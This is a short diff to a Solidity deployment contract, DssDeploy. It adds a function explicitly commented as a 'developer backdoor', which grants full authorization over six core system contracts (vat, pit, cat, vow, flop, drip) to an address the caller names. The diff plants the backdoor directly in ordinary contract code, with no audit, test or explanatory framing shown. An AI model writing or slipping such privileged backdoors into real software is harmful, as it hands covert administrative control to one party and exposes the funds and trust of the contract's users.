@@ -288,4 +288,14 @@ contract DssDeploy is DSAuth {
         // Update price
         ilks[ilk].price.poke();
     }
+
+    // developer backdoor
+    function rely(address dev) public auth {
+        vat.rely(dev);
+        pit.rely(dev);
+        cat.rely(dev);
+        vow.rely(dev);
+        flop.rely(dev);
+        drip.rely(dev);
+    }
 }
